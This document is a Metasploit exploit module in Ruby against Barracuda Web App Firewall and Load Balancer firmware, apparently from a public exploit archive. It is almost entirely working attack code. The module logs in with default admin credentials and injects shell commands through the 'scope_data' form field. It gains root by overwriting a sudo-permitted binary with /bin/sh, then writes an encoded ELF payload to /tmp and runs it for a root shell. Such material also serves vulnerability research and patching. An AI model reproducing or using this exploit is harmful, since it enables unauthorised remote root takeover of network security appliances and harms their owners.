# Exploit Title: Barracuda Web App Firewall/Load Balancer Post Auth Remote Root Exploit
# Date: 07/21/16
# Exploit Author: xort xort@blacksecurity.org 
# Vendor Homepage: https://www.barracuda.com/
# Software Link: https://www.barracuda.com/products/loadbalance & https://www.barracuda.com/products/webapplicationfirewall
# Version: Load Balancer Firmware <= v5.4.0.004 (2015-11-26) & Web App Firewall Firmware <= 8.0.1.007 (2016-01-07)
# Tested on: Load Balancer Firmware <= v5.4.0.004 (2015-11-26) & Web App Firewall Firmware <= 8.0.1.007 (2016-01-07) 
# CVE : None.


# vuln: ondefine_modify_admin_role trigger exploit

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
	Rank = ExcellentRanking
	include  Exploit::Remote::Tcp
        include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Barracuda Web App Firewall/Load Balancer Post Auth Remote Root Exploit',
			'Description'    => %q{
					This module exploits a remote command execution vulnerability in
				the Barracuda Web App Firewall Firmware Version <= 8.0.1.007 and Load Balancer Firmware <= v5.4.0.004
				by exploiting a vulnerability in the web administration interface. By sending a specially crafted request 
				it's possible to inject system commands while escalating to root do to relaxed sudo configurations on the applianaces.  
			},
			'Author'         =>
				[
					'xort', # vuln + metasploit module
				],
			'Version'        => '$Revision: 2 $',
			'References'     =>
				[
					[ 'none', 'none'],
				],
			'Platform'      => [ 'linux'],
			'Privileged'     => true,
			 'Arch'          => [ ARCH_X86 ],
                        'SessionTypes'  => [ 'shell' ],
                        'Privileged'     => false,

		        'Payload'        =>
                                { 
                                  'Compat' =>
                                  {
                                        'ConnectionType' => 'find',
                                  }
                                },

			'Targets'        =>
				[
					['Barracuda Web App Firewall Firmware Version <= 8.0.1.007 (2016-01-07)',
						{
								'Arch' => ARCH_X86,
								'Platform' => 'linux',
								'SudoCmdExec' => "/home/product/code/firmware/current/bin/config_agent_wrapper.pl"
						}
					],

					['Barracuda Load Balancer Firmware <= v5.4.0.004 (2015-11-26)',
						{
								'Arch' => ARCH_X86,
								'Platform' => 'linux',
								'SudoCmdExec' => "/home/product/code/firmware/current/bin/rdpd"
						}
					],
				],
			'DefaultTarget' => 0))

			register_options(
				[
					OptString.new('PASSWORD', [ false, 'Device password', "" ]),	
					OptString.new('ET', [ false, 'Device password', "" ]),
			         	OptString.new('USERNAME', [ true, 'Device password', "admin" ]),	
					OptString.new('CMD', [ false, 'Command to execute', "" ]),	
					Opt::RPORT(8000),
				], self.class)
	end

        def do_login(username, password_clear, et)
                vprint_status( "Logging into machine with credentials...\n" )

                # vars
                timeout = 1550;
                enc_key = Rex::Text.rand_text_hex(32)

                # send request  
                res = send_request_cgi(
                {
                      'method'  => 'POST',
                      'uri'     => "/cgi-mod/index.cgi",
		      'headers' => 
			{
				'Accept' => "application/json, text/javascript, */*; q=0.01",
				'Content-Type' => "application/x-www-form-urlencoded",
				'X-Requested-With' => "XMLHttpRequest"
			},
                      'vars_post' =>
                        {

                          'enc_key' => enc_key,
                          'et' => et,
                          'user' => "admin", # username,
                          'password' => "admin", # password_clear,
                          'enctype' => "none",
                          'password_entry' => "",
			  'login_page' => "1",
                          'login_state' => "out",
                          'real_user' => "",
                          'locale' => "en_US",
                          'form' => "f",
                          'Submit' => "Sign in",
                        }
                }, timeout)

                # get rid of first yank 
                password = res.body.split('\n').grep(/(.*)password=([^&]+)&/){$2}[0] #change to match below for more exact result
                et = res.body.split('\n').grep(/(.*)et=([^&]+)&/){$2}[0]

                return password, et
        end

	def run_command(username, password, et, cmd)
		vprint_status( "Running Command...\n" )

		sudo_cmd_exec = target.SudoCmdExec

                sudo_run_cmd_1 = "sudo /bin/cp /bin/sh #{sudo_cmd_exec} ; sudo /bin/chmod +x #{sudo_cmd_exec}"
                sudo_run_cmd_2 = "sudo #{sudo_cmd_exec} -c "

                # random filename to dump too + 'tmp' HAS to be here.
                dumpfile = "/tmp/" + rand_text_alphanumeric(4+rand(4))

		encoded_cmd = cmd.unpack("H*").join().gsub(/(\w)(\w)/,'\\x\1\2')

		injection_string = "printf \"#{encoded_cmd}\" > #{dumpfile} ; /bin/chmod +x #{dumpfile} ; #{sudo_run_cmd_1} ; #{sudo_run_cmd_2} #{dumpfile} ; rm #{dumpfile}" 

	 	exploitreq = [
		[ "auth_type","Local" ],
		[ "et",et ],
		[ "locale","en_US" ],
		[ "password", password  ],
		[ "primary_tab", "BASIC" ],
		[ "realm","" ],
		[ "secondary_tab","reports" ],
		[ "user", username ],
		[ "timestamp", Time.now.to_i ],
		
		[ "scope", "" ],
		[ "scope_data", "; #{injection_string} ;" ], # vuln
		[ "modify_admin_role", "" ] 

		]

		
		boundary = "---------------------------" + Rex::Text.rand_text_numeric(34)

		post_data = ""
	
		exploitreq.each do |xreq|
		    post_data << "--#{boundary}\r\n"
		    post_data << "Content-Disposition: form-data; name=\"#{xreq[0]}\"\r\n\r\n"
		    post_data << "#{xreq[1]}\r\n"
		end
	    	post_data << "--#{boundary}--\r\n"

	        res = send_request_cgi({
         	   'method' => 'POST',
	           'uri'    => "/cgi-mod/index.cgi",
       		   'ctype'  => "multipart/form-data; boundary=#{boundary}",
            	   'data'   => post_data,
		   'headers' => 
			{
				'UserAgent' => "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0",
				'Accept' => "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
				'Accept-Language' => "en-US,en;q=0.5"
			}
	        })	

	end

	def run_script(username, password, et, cmds)
	  	vprint_status( "running script...\n")
	  
	  
	end
	
	def exploit
		# timeout
		timeout = 1550;

		user = "admin"
		
		# params
                real_user = "";
		login_state = "out"
		et = Time.now.to_i
		locale = "en_US"
		user = "admin"
		password = "admin"
		enctype = "MD5"
		password_entry = ""
		password_clear = "admin"
		

		password_hash, et = do_login(user, password_clear, et)
		vprint_status("new password: #{password_hash} et: #{et}\n")

		sleep(5)


		# if no 'CMD' string - add code for root shell
                if not datastore['CMD'].nil? and not datastore['CMD'].empty?

                        cmd = datastore['CMD']

                        # Encode cmd payload
                        encoded_cmd = cmd.unpack("H*").join().gsub(/(\w)(\w)/,'\\x\1\2')

                        # kill stale calls to bdump from previous exploit calls for re-use
                        run_command(user, password_hash, et, ("sudo /bin/rm -f /tmp/n ;printf \"#{encoded_cmd}\" > /tmp/n; chmod +rx /tmp/n ; /tmp/n" ))
                else
                        # Encode payload to ELF file for deployment
                        elf = Msf::Util::EXE.to_linux_x86_elf(framework, payload.raw)
                        encoded_elf = elf.unpack("H*").join().gsub(/(\w)(\w)/,'\\x\1\2')

                        # kill stale calls to bdump from previous exploit calls for re-use
                        run_command(user, password_hash, et, ("sudo /bin/rm -f /tmp/m ;printf \"#{encoded_elf}\" > /tmp/m; chmod +rx /tmp/m ; /tmp/m" ))

                        handler
                end


	end

end
